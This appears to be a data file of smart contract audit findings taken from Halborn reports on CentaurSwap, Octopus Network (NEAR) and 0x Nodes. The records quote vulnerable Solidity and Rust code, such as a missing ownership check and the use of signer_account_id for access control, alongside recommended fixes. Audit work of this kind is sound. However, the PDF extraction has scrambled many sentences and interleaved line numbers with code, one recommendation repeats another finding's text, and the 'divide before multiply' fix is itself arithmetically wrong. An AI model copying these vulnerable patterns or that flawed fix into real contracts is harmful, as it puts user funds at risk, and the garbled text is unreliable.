a method of informing the transaction initiator about the actions taken by the called function. It logs its emitted parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. Code Location: CentaurFactoryTimeLock.sol Listing 6: Functions (Lines ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function createPool ( address _baseToken , address _oracle , uint _liquidityParameter ) function addPool ( address _pool ) function removePool ( address _pool ) function transferOwnership ( address _owner ) function setPoolTradeEnabled ( address _pool , bool _tradeEnabled ) function setPoolDepositEnabled ( address _pool , bool _depositEnabled ) function setPoolWithdrawEnabled ( address _pool , bool _withdrawEnabled ) function setPoolLiquidityParameter ( address _pool , uint _liquidityParameter ) function setAllPoolsTradeEnabled ( bool _tradeEnabled ) function setAllPoolsDepositEnabled ( bool _depositEnabled ) function setAllPoolsWithdrawEnabled ( bool _withdrawEnabled ) function emergencyWithdrawFromPool ( address _pool , address _token , uint _amount , address _to ) function setRouterOnlyEOAEnabled ( bool _onlyEOAEnabled ) function setRouterContractWhitelist ( address _address , bool _whitelist ) function setSettlementDuration ( uint _duration ) function setPoolFee ( uint _poolFee ) 18 17 18 19 20 function setPoolLogic ( address _poolLogic ) function setCloneFactory ( address _cloneFactory ) function setSettlement ( address _settlement ) function setRouter ( address payable _router ) Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider as much as possible declaring events at the end of function. Events can be used to detect the end of the operation. Remediation Plan: PENDING: CentaurSwap Team will add event in a future release of CentaurFactory instead of CentaurFactoryTimeLock contract. 19 ", "labels": ["Halborn", "CentaurSwap_Timelock", "Severity: Low"]}, {"title": "MISSING ADDRESS VALIDATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Timelock_Smart_Contract_Security_Audit_v1_1.pdf", "body": "The CentaurFactoryTimeLock.sol contract has lack a safety check inside Setters of address type parameters should constructor and functions. Otherwise, contract functionality may include a zero-address check. become inaccessible, or tokens could be burnt forever. Code Location: CentaurFactoryTimeLock.sol Listing 7: CentaurFactoryTimeLock.sol (Lines ) 35 36 37 38 39 40 41 42 43 44 45 46 47 constructor ( ICentaurFactory _centaurFactory , address _admin , address _normalMaintainer , address _emergencyMaintainer ) public { centaurFactory = _centaurFactory ; _setRoleAdmin ( TIMELOCK_ADMIN_ROLE , TIMELOCK_ADMIN_ROLE ); _setRoleAdmin ( NORMAL_MAINTAINER_ROLE , TIMELOCK_ADMIN_ROLE ) ; _setRoleAdmin ( EMERGENCY_MAINTAINER_ROLE , TIMELOCK_ADMIN_ROLE ); _setupRole ( TIMELOCK_ADMIN_ROLE , _admin ); _setupRole ( NORMAL_MAINTAINER_ROLE , _normalMaintainer ); _setupRole ( EMERGENCY_MAINTAINER_ROLE , _emergencyMaintainer ); PENDING_UNLOCK = false ; } Listing 8: CentaurFactoryTimeLock.sol (Lines ) 35 constructor ( ICentaurFactory _centaurFactory , address _admin , address function createPool ( address _baseToken , address 20 _oracle , uint _liquidityParameter ) function addPool ( address _pool ) function removePool ( address _pool ) function transferOwnership ( address _owner ) function setPoolTradeEnabled ( address _pool , bool _tradeEnabled ) function setPoolDepositEnabled ( address _pool , bool _depositEnabled ) function setPoolWithdrawEnabled ( address _pool , bool _withdrawEnabled ) function setPoolLiquidityParameter ( address _pool , uint _liquidityParameter ) function emergencyWithdrawFromPool ( address _pool , address _token , uint _amount , address _to ) function setRouterContractWhitelist ( address _address , bool _whitelist ) function setPoolLogic ( address _poolLogic ) function setCloneFactory ( address _cloneFactory ) function setSettlement ( address _settlement ) function setRouter ( address payable _router ) 36 37 38 39 40 41 42 43 44 45 46 47 48 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. Better yet, address white-listing/black-listing should be implemented in relevant functions if possible. For example: Listing 9: Modifier.sol (Lines 2,3,4) 1 2 3 4 modifier validAddress ( address addr ) { require ( addr != address (0) , \" Address cannot be 0 x0 \"); require ( addr != address ( this ) , \" Address cannot be contract \" ); _; 21 5 } Remediation Plan: SOLVED: CentaurSwap Team added Zero-Address check. 22 ", "labels": ["Halborn", "CentaurSwap_Timelock", "Severity: Low"]}, {"title": "LACK OF DELAY DEFINITION ON THE CRITICAL FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Timelock_Smart_Contract_Security_Audit_v1_1.pdf", "body": "In the CentaurFactoryTimeLock contracts, the some of the functions do not have timelock. The timelock is a fixed delay time that allows for some reaction time in the event of an unexpected change that is not agreed upon or malicious, and therefore it is possible to unlock the funds and secure them. Code Location: CentaurFactoryTimeLock.sol Listing 10: Functions (Lines ) 1 2 3 4 5 6 7 8 9 10 11 function setPoolFee ( uint _poolFee ) external onlyRole ( NORMAL_MAINTAINER_ROLE ) { centaurFactory . setPoolFee ( _poolFee ); } function setPoolLogic ( address _poolLogic ) external onlyRole ( NORMAL_MAINTAINER_ROLE ) { centaurFactory . setPoolLogic ( _poolLogic ); } function setPoolLiquidityParameter ( address _pool , uint _liquidityParameter ) public onlyRole ( NORMAL_MAINTAINER_ROLE ) { centaurFactory . setPoolLiquidityParameter ( _pool , _liquidityParameter ); } 23 Risk Level: Likelihood - 1 Impact - 1 Recommendation: The timelock should be stated on the critical changes. Whenever the timelock is set by the functions, no one can reduce the waiting time unless using a governance system or an emergency role. Remediation Plan: ACKNOWLEDGED: CentaurSwap Team claims that this is intended. Timelock is only in place for emergency withdrawal. The rest of the functions are governed by Multisig confirmations. 24 ", "labels": ["Halborn", "CentaurSwap_Timelock", "Severity: Informational"]}, {"title": "MISSING CONSTANT DEFINITION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Timelock_Smart_Contract_Security_Audit_v1_1.pdf", "body": "State variables should be declared constant to save gas. Without constant definition, the state variable reading progress is performed through the SLOAD operation which costs 200 gas alone. Code Location: CentaurFactoryTimeLock.sol Line #21 Listing 11: CentaurFactoryTimeLock.sol (Lines 21) 21 uint public TIMELOCK_PERIOD = 1 days ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Add the constant attributes to state variables that never change. Remediation Plan: SOLVED: CentaurSwap Team solved in HAL-03 remediation plan. 25 3.8 STATIC ANALYSIS REPORT ", "labels": ["Halborn", "CentaurSwap_Timelock", "Severity: Informational"]}, {"title": "ANYONE CAN CHANGE OCT TOKEN ACCOUNT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the change_oct_token is lacking the ownership check, which allows anyone to change the OCT token account. Code Location: Listing 1: appchain-registry/src/sudo_actions.rs (Lines 19) // fn change_oct_token (& mut self , oct_token : AccountId ) { 17 impl SudoActions for AppchainRegistry { 18 19 20 21 22 self . oct_token = oct_token ; } Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to add self.assert_owner(); to prevent anyone from changing the OCT token account. Remediation Plan: SOLVED: The Octopus Network team solved this issue by removing this function. 16 ", "labels": ["Halborn", "Octopus_Network_NEAR", "Severity: Critical"]}, {"title": "SMART CONTRACT MAIN FUNCTIONALITY DoS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the project is vulnerable to DoS of the main func- tionality. In NEAR, there is a validation that tells whether the account format is valid or not. During conclude_voting_score, the new sub_account is created by appending the appchain_id to the registry account: Listing 2: appchain-registry/src/registry_owner_actions.rs (Lines 187) self . assert_owner () ; assert! ( 180 fn conclude_voting_score (& mut self ) { 181 182 183 184 185 186 !self . top_appchain_id_in_queue . is_empty () , \" There is no appchain on the top of queue yet .\" ); // Set the appchain with the largest voting score to go ` 187 188 189 190 191 staging ` let sub_account_id = format! ( \" {}.{} \" , & self . top_appchain_id_in_queue , env :: current_account_id () ); Then, at the end, smart contracts creates a new create_account promise action to create new sub account: Listing 3: appchain-registry/src/registry_owner_actions.rs (Lines 215) 214 215 216 217 218 Promise :: new ( sub_account_id ) . create_account () . transfer ( APPCHAIN_ANCHOR_INIT_BALANCE ) . add_full_access_key ( self . owner_pk . clone () ); } The issue is that no check ensures that the appchain_id complies with Therefore, if invalid appchain_id became NEARs validation rules. 17 top_appchain_id_in_queue and used during the creation of sub_account, the smart contract will inevitably panic during the creation of the account. Since there is no functionality to remove top_appchain_id_in_queue, the The smart contract will smart contract wont conclude votes anymore. get stuck it at that appchain_id. Code Location: Listing 4: appchain-registry/src/registry_owner_actions.rs (Lines 215) 214 215 216 217 218 Promise :: new ( sub_account_id ) . create_account () . transfer ( APPCHAIN_ANCHOR_INIT_BALANCE ) . add_full_access_key ( self . owner_pk . clone () ); } Risk Level: Likelihood - 5 Impact - 5 Recommendation: Even though the Octopus Network team reviews appchains and their regis- tration data manually to avoid that, the issue is critical from the smart contract perspective. It is always better to be safe from human error. Therefore, please add account validation during the appchain registration phase to avoid this issue. You can utilize is_top_level_account_id and is_sub_account_of functions within the nearcore. Remediation Plan: SOLVED: The Octopus Network team solved the issue by using ValidAccountId helper class. 18 Fixed Code: Listing 5: appchain-registry/src/lib.rs (Lines 329,330,331) 325 326 327 328 329 330 331 332 333 334 assert! ( !appchain_id . trim () . is_empty () , \" Missing necessary field ' appchain_id '. \" ); assert! ( appchain_id . find (\" . \"). is_none () , \" Invalid ' appchain_id '. \"); assert! ( ValidAccountId :: try_from ( format! ( \" {}.{} \" , appchain_id , env :: current_account_id () )) . is_ok () , \" Invalid ' appchain_id '. \" ); 19 ", "labels": ["Halborn", "Octopus_Network_NEAR", "Severity: Critical"]}, {"title": "IMPROPER ROLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that most of the privileged functionality is controlled by the owner. Additional authorization levels are needed to implement the least privilege principle, also known as least-authority, which ensures only authorized processes, users, or programs can access the necessary resources or information. The ownership role is helpful in a simple system, but more complex projects require more roles by using role-based access control. Code Location: The owner can access those functions:  All functions in sudo_actions.rs  All functions in registry_settings_actions.rs  All functions in registry_owner_actions.rs except count_voting_score  set_owner in lib.rs Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to add additional roles to comply with the least privilege principle and limit the privileges of owner. 20 Remediation Plan: SOLVED: The Octopus Network team solved the issue by adding role based access control functionality.. 21 ", "labels": ["Halborn", "Octopus_Network_NEAR", "Severity: High"]}, {"title": "REGISTRY OWNER CAN SET ITSELF AS VOTER OPERATOR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the owner could set itself as a voter_operator. This functionality violates the principle of least privilege giving the owner additional privileges. Code Location: Listing 6: 57) appchain-registry/src/registry_settings_actions.rs (Lines fn change_operator_of_counting_voting_score (& mut self , operator_account : AccountId ) { self . assert_owner () ; let mut registry_settings = self . registry_settings . get () . unwrap () ; registry_settings . operator_of_counting_voting_score . clear () ; registry_settings . operator_of_counting_voting_score . push_str (& operator_account ); self . registry_settings . set (& registry_settings ); } 57 58 59 60 61 62 63 64 65 66 Risk Level: Likelihood - 3 Impact - 4 Recommendation: It is recommended to add another check to do not allow the owner to set itself as a voter operator. 22 Remediation Plan: SOLVED: The Octopus Network team solved the issue by adding relevant check. Fixed Code: Listing 7: 61) appchain-registry/src/registry_settings_actions.rs (Lines 57 58 59 60 61 62 63 64 65 66 67 68 69 70 fn change_operator_of_counting_voting_score (& mut self , operator_account : AccountId ) { self . assert_owner () ; assert_ne! ( operator_account , self . owner , \" The account should NOT be the owner . \" ); let mut registry_settings = self . registry_settings . get () . unwrap () ; assert_ne! ( operator_account , registry_settings . operator_of_counting_voting_score , \" The account is not changed . \" ); registry_settings . operator_of_counting_voting_score = operator_account ; self . registry_settings . set (& registry_settings ); } 23 ", "labels": ["Halborn", "Octopus_Network_NEAR", "Severity: Medium"]}, {"title": "REGISTRY OWNER CAN BE SET AS APPCHAIN OWNER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the owner could be set as an appchain_owner. This functionality violates the principle of least privilege giving the owner additional privileges. Code Location: appchain-registry/src/lib.rs: register_appchain - sender_id should not be equal to the registry owner appchain-registry/src/appchain_owner_actions.rs: transfer_appchain_ownership - new_owner should not be equal to the registry owner Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to add an additional check to do not allow the owner to set itself as an voter operator. Remediation Plan: PARTIALLY SOLVED: The Octopus Network team partially solved the issue by adding the required check only to appchain-registry/src/lib.rs. Fixed Code: 24 appchain-registry/src/lib.rs Listing 8: appchain-registry/src/lib.rs (Lines 308,309,310) 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 fn register_appchain ( & mut self , sender_id : AccountId , appchain_id : AppchainId , register_deposit : Balance , website_url : String , function_spec_url : String , github_address : String , github_release : String , contact_email : String , premined_wrapped_appchain_token_beneficiary : AccountId , premined_wrapped_appchain_token : U128 , ido_amount_of_wrapped_appchain_token : U128 , initial_era_reward : U128 , fungible_token_metadata : FungibleTokenMetadata , custom_metadata : HashMap < String , String >, ) { assert_ne! ( sender_id , self . owner , \" The register account should NOT be the contract owner . \" ); 25 ", "labels": ["Halborn", "Octopus_Network_NEAR", "Severity: Medium"]}, {"title": "USAGE OF SIGNER ACCOUNT ID INSTEAD OF PREDECESSOR ID IN ACCESS CONTROL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the env::signer_account_id() was used in the assert_appchain_owner to assert whether the caller is the appchain_owner.  env::signer_account_id(): The id of the account that either signed the original transaction or issued the initial cross-contract call.  env::predecessor_account_id(): The id of the account that was the previous contract in the chain of cross-contract calls. If this is the first contract, it is equal to signer_account_id. From their definitions above, we can derive that the usage of env:: signer_account_id() is risky in access control scenarios. There is a risk that the appchain owner can be phished to sign the cross contract call and hence unknowingly let the malicious contract execute functions in the projects contract under that owners role. Code Location: Listing 9: appchain-registry/src/lib.rs (Lines 178) 175 fn assert_appchain_owner (& self , appchain_id : & AppchainId ) { let appchain_basedata = self . get_appchain_basedata ( 176 177 178 179 180 181 182 appchain_id ); assert_eq! ( env :: signer_account_id () , appchain_basedata . owner () . clone () , \" Function can only be called by appchain owner . \" ); } 26 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider replacing env::signer_account_id() with env::predecessor_account_id () to avoid that risk. Remediation Plan: SOLVED: The Octopus Network team solved the issue by changing env:: signer_account_id() to env::predecessor_account_id(). Fixed Code: Listing 10: appchain-registry/src/lib.rs (Lines 178) 175 fn assert_appchain_owner (& self , appchain_id : & AppchainId ) { let appchain_basedata = self . get_appchain_basedata ( 176 177 178 179 180 181 182 appchain_id ); assert_eq! ( env :: predecessor_account_id () , appchain_basedata . owner () . clone () , \" Function can only be called by appchain owner . \" ); } 27 ", "labels": ["Halborn", "Octopus_Network_NEAR", "Severity: Medium"]}, {"title": "APPCHAIN CAN BE REGISTERED WITHOUT CORE DETAILS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that it is possible to register an appchain without providing any core details such as appchain_id, website_url, and so on. Those details are needed for intended functionality of the application. Code Location: Existence of those fields has to be enforced: appchain-registry/src/lib.rs: register_appchain  appchain_id  website_url  function_spec_url  github_address  github_release  contact_email  premined_wrapped_appchain_token_beneficiary  fungible_token_metadata.name  fungible_token_metadata.symbol Risk Level: Likelihood - 4 Impact - 3 Recommendation: It is recommended to add additional checks to enforces those fields. 28 Remediation Plan: SOLVED: The Octopus Network team solved the issue by enforcing required fields. Fixed Code: Listing 11: appchain-registry/src/lib.rs 334 assert! ( 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 !appchain_id . trim () . is_empty () , \" Missing necessary field ' appchain_id '. \" ); assert! ( !website_url . trim () . is_empty () , \" Missing necessary field ' website_url '. \" ); assert! ( !function_spec_url . trim () . is_empty () , \" Missing necessary field ' function_spec_url '. \" ); assert! ( !github_address . trim () . is_empty () , \" Missing necessary field ' github_address '. \" ); assert! ( !github_release . trim () . is_empty () , \" Missing necessary field ' github_release '. \" ); assert! ( !contact_email . trim () . is_empty () , \" Missing necessary field ' contact_email '. \" ); assert! ( !premined_wrapped_appchain_token_beneficiary . trim () . is_empty () , \" Missing necessary field ' premined_wrapped_appchain_token_beneficiary '. \" ); fungible_token_metadata . assert_valid () ; assert! ( !fungible_token_metadata . name . trim () . is_empty () , \" Missing necessary field ' fungible token name '. \" 29 368 369 370 371 372 ); assert! ( !fungible_token_metadata . symbol . trim () . is_empty () , \" Missing necessary field ' fungible token symbol '. \" ); 30 ", "labels": ["Halborn", "Octopus_Network_NEAR", "Severity: Medium"]}, {"title": "MISSING CARGO OVERFLOW CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that there is no overflow-checks=true in Cargo.toml. By default, overflow checks are disabled in optimized release builds. Hence, if there is an overflow in release builds, it will be silenced, leading to unexpected behavior of an application. Even if checked arithmetic is used through checked_*, it is recommended to have that check in Cargo.toml. Code Location:  Cargo.toml Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to add overflow-checks=true under your release profile in Cargo.toml. Remediation Plan: SOLVED: The Octopus Network team solved the issue by adding overflow- checks=true. 31 ", "labels": ["Halborn", "Octopus_Network_NEAR", "Severity: Low"]}, {"title": "LACK OF PAUSABILITY OF SMART CONTRACTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It is advised that in The project lacks ability to pause contracts. case of unexpected events temporarily disable some important functions to prevent further damage. Risk Level: Likelihood - 1 Impact - 4 Recommendation: Consider implementing the pause feature in the smart contracts. Further- more, it is recommended to add a separate role for being responsible for pausing smart contracts when needed. Remediation Plan: SOLVED: The Octopus Network team solved the issue by adding the paus- ability to smart contracts. 32 3.10 (HAL-10) USAGE OF VULNERABLE CRATES - LOW ", "labels": ["Halborn", "Octopus_Network_NEAR", "Severity: Informational"]}, {"title": "IMPROPER APPLICATION OF PRINCIPLE OF LEAST PRIVILEGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In Kernel.sol during initialization, _owner is assigned to both OWNER_ROLE and MANAGER_ROLE, which violates the principle of least privilege. Also, setting the OWNER_ROLE as role admin for MANAGER_ROLE through _setRoleAdmin(MANAGER_ROLE, OWNER_ROLE); has no benefits. Code Location: Listing 1: Kernel.sol (Lines 135,138,141) ) external initializer { __ModuleMapConsumer_init ( moduleMap_ ); __AccessControl_init () ; address admin_ , address owner_ , address moduleMap_ 123 function initialize ( 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 } // make the \" admin_ \" address the default admin role _setupRole ( DEFAULT_ADMIN_ROLE , admin_ ); // make the \" owner_ \" address the owner of the system _setupRole ( OWNER_ROLE , owner_ ); // give the \" owner_ \" address the manager role , too _setupRole ( MANAGER_ROLE , owner_ ); // owners are admins of managers _setRoleAdmin ( MANAGER_ROLE , OWNER_ROLE ); initializationTimestamp = block . timestamp ; 17 Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to have different addresses assigned to both OWNER_ROLE and MANAGER_ROLE and update deployment scripts to reflect changes. Remediation Plan: RISK ACCEPTED: 0x_nodes accepts the risk and they will fix the issue in a future release. 18 ", "labels": ["Halborn", "0x_Nodes", "Severity: Medium"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit OpenZeppelin has its own mutex the function with a recursive call. implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against the Reentrancy attacks. Code Location: There are many functions within the project that are missing nonReentrant modifier. Kernel.sol - deposit - withdraw - claimEthRewards - claimBiosRewards - claimAllRewards - enterStrategy - exitStrategy Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to follow the checks-effects-interactions pattern and use ReentrancyGuard through the nonReentrant modifier. 19 Remediation Plan: SOLVED: 0x_nodes team added the nonReentrant modifier to all required functions. 20 ", "labels": ["Halborn", "0x_Nodes", "Severity: Medium"]}, {"title": "LACK OF PAUSE FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It is advised that in The project lacks ability to pause contracts. case of unexpected events temporarily disable some important functions to prevent further damage. Risk Level: Likelihood - 1 Impact - 4 Remediation: Consider implementing the pause feature in the smart contracts. It can be achieved by using OpenZepplins PausableUpgradeable contracts. Also, it is recommended to add a separate role for being responsible for pausing smart contracts when needed. References:  https://github.com/OpenZeppelin/openzeppelin-contracts- upgradeable/blob/master/contracts/security/PausableUpgradeable.sol Remediation Plan: ACKNOWLEDGED: 0x_nodes acknowledged the issue and they will fix it in a future release. 21 ", "labels": ["Halborn", "0x_Nodes", "Severity: Low"]}, {"title": "DIVIDE BEFORE MULTIPLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Solidity integer division might truncate. As a result, performing mul- tiplication before division can sometimes avoid loss of precision. In SushiSwapIntegration.sol, there are two instances of multiplication per- formed on the result of division. Code Location: Listing 2: SushiSwapIntegration.sol (Lines 134,135) 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 function getPoolEthValue ( uint256 poolid ) public view returns ( uint256 poolETHValue ) { address token0 = pools [ poolid ]. tokenPair . token0 ; address token1 = pools [ poolid ]. tokenPair . token1 ; uint256 lpAmount = pools [ poolid ]. poolInfo . lpToken . balanceOf ( address ( this )) + ISushiSwapMasterChef ( masterChef ). userInfo ( poolid , address ( this )) . amount ; uint256 sharePercent = ( lpAmount * 10000000000 / pools [ poolid ]. poolInfo . lpToken . totalSupply () ); if ( sharePercent == 0) { return 0; } uint256 token0Amount = sharePercent / 2 * IERC20 ( token0 ). balanceOf ( address ( pools [ poolid ]. poolInfo . lpToken )) / 10000000000; uint256 token1Amount = sharePercent / 2 * IERC20 ( token1 ). balanceOf ( address ( pools [ poolid ]. poolInfo . lpToken )) / 10000000000; return wethAddress == address ( token0 ) ? token0Amount + getAmountOut ( token1 , token0 , token1Amount ) : token1Amount + getAmountOut ( token0 , token1 , 22 140 } token0Amount ); Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider doing multiplication operation before division to prevail pre- cision in the values in non-floating data type. The sample solution is shared in the code snippet below. Listing 3: SushiSwapIntegration.sol (Lines 134,135) function getPoolEthValue ( uint256 poolid ) public view returns ( uint256 poolETHValue ) { address token0 = pools [ poolid ]. tokenPair . token0 ; address token1 = pools [ poolid ]. tokenPair . token1 ; uint256 lpAmount = pools [ poolid ]. poolInfo . lpToken . balanceOf ( address ( this )) + ISushiSwapMasterChef ( masterChef ). userInfo ( poolid , address ( this )) . amount ; uint256 sharePercent = ( lpAmount * 10000000000 / pools [ poolid ]. poolInfo . lpToken . totalSupply () ); if ( sharePercent == 0) { return 0; } uint256 token0Amount = sharePercent / (2 * IERC20 ( token0 ). balanceOf ( address ( pools [ poolid ]. poolInfo . lpToken )) ) / 10000000000; uint256 token1Amount = sharePercent / (2 * IERC20 ( token1 ). balanceOf ( address ( pools [ poolid ]. poolInfo . lpToken )) ) / 10000000000; 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 23 139 return wethAddress == address ( token0 ) ? token0Amount + getAmountOut ( token1 , token0 , token1Amount ) : token1Amount + getAmountOut ( token0 , token1 , token0Amount ); 140 } Remediation Plan: SOLVED: 0x_nodes team fixed the code to perform multiplication first. 24 ", "labels": ["Halborn", "0x_Nodes", "Severity: Low"]}, {"title": "USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There are many instances of block.timestamp usage within the project. block.timestamp can be influenced by miners to a certain degree, so developers should be aware that this may have some risk if miners collude on time manipulation to influence the price oracles. Code Location: Listing 4: Kernel.sol (Lines 143) ) external initializer { __ModuleMapConsumer_init ( moduleMap_ ); __AccessControl_init () ; address admin_ , address owner_ , address moduleMap_ 123 function initialize ( 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 } // make the \" admin_ \" address the default admin role _setupRole ( DEFAULT_ADMIN_ROLE , admin_ ); // make the \" owner_ \" address the owner of the system _setupRole ( OWNER_ROLE , owner_ ); // give the \" owner_ \" address the manager role , too _setupRole ( MANAGER_ROLE , owner_ ); // owners are admins of managers _setRoleAdmin ( MANAGER_ROLE , OWNER_ROLE ); initializationTimestamp = block . timestamp ; 25 Listing 5: Kernel.sol (Lines 561) 559 function deploy () external onlyGasAccount { 560 IYieldManager ( moduleMap . getModuleAddress ( Modules . YieldManager ) ). deploy () ; lastDeployTimestamp = block . timestamp ; emit Deploy () ; 561 562 563 } Listing 6: Kernel.sol (Lines 569) 566 function harvestYield () external onlyGasAccount { 567 IYieldManager ( moduleMap . getModuleAddress ( Modules . YieldManager ) ) . harvestYield () ; lastHarvestYieldTimestamp = block . timestamp ; emit HarvestYield () ; 568 569 570 571 } Listing 7: Kernel.sol (Lines 577) 574 function processYield () external onlyGasAccount { 575 IYieldManager ( moduleMap . getModuleAddress ( Modules . YieldManager ) ) . processYield () ; lastProcessYieldTimestamp = block . timestamp ; emit ProcessYield () ; 576 577 578 579 } 26 Listing 8: Kernel.sol (Lines 586) 582 function distributeEth () external onlyGasAccount { 583 IYieldManager ( moduleMap . getModuleAddress ( Modules . YieldManager ) ) . distributeEth () ; lastLastDistributeEthTimestamp = lastDistributeEthTimestamp ; lastDistributeEthTimestamp = block . timestamp ; emit DistributeEth () ; 584 585 586 587 588 } Listing 9: Kernel.sol (Lines 594) 591 function biosBuyBack () external onlyGasAccount { 592 IYieldManager ( moduleMap . getModuleAddress ( Modules . YieldManager ) ) . biosBuyBack () ; lastBiosBuyBackTimestamp = block . timestamp ; emit BiosBuyBack () ; 593 594 595 596 } 27 Listing 10: BiosRewards.sol (Lines 55,58,62,63) 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 function notifyRewardAmount ( address token , uint256 reward , uint32 duration ) external override onlyController updateReward ( token , address (0) ) { if ( block . timestamp >= periodFinish [ token ]) { rewardRate [ token ] = reward / duration ; } else { uint256 remaining = periodFinish [ token ] - block . timestamp ; uint256 leftover = remaining * rewardRate [ token ]; rewardRate [ token ] = ( reward + leftover ) / duration ; } lastUpdateTime [ token ] = block . timestamp ; periodFinish [ token ] = block . timestamp + duration ; totalBiosRewards += reward ; emit RewardAdded ( token , reward , duration ); } Listing 11: BiosRewards.sol (Lines 107) 101 102 103 104 105 106 107 108 function lastTimeRewardApplicable ( address token ) public view override returns ( uint256 ) { } return MathUpgradeable . min ( block . timestamp , periodFinish [ token ]) ; 28 Listing 12: SushiSwapTrader.sol (Lines 140) 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 function swapExactInput ( address tokenIn , address tokenOut , address recipient , uint256 amountIn , uint256 amountOutMin ) public override onlyController returns ( bool ) { require ( IERC20MetadataUpgradeable ( tokenIn ). balanceOf ( address ( this )) >= amountIn , \" SushiSwapTrader :: swapExactInput : Balance is less than trade amount \" ); address [] memory path = new address [](2) ; path [0] = tokenIn ; path [1] = tokenOut ; uint256 deadline = block . timestamp ; ... }  Also, anywhere deadline is used. 29 Listing 13: UniswapTrader.sol (Lines 306,343) 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 function swapExactInput ( address tokenIn , address tokenOut , address recipient , uint256 amountIn ) external override onlyController returns ( bool tradeSuccess ) { IERC20MetadataUpgradeable tokenInErc20 = IERC20MetadataUpgradeable ( tokenIn ); if ( isMultihopPair [ tokenIn ][ tokenOut ]) { Path memory path = getPathFor ( tokenIn , tokenOut ); IUniswapSwapRouter . ExactInputParams memory params = IUniswapSwapRouter . ExactInputParams ({ path : abi . encodePacked ( path . tokenIn , path . firstPoolFee , path . tokenInTokenOut , path . secondPoolFee , path . tokenOut ) , recipient : recipient , deadline : block . timestamp , amountIn : amountIn , amountOutMinimum : 0 }) ; // Executes the swap . try IUniswapSwapRouter ( swapRouterAddress ). exactInput ( params ) { tradeSuccess = true ; } catch { tradeSuccess = false ; tokenInErc20 . safeTransfer ( recipient , tokenInErc20 . balanceOf ( address ( this )) ); } return tradeSuccess ; } ( address token0 , address token1 ) = getTokensSorted ( tokenIn , 30 tokenOut 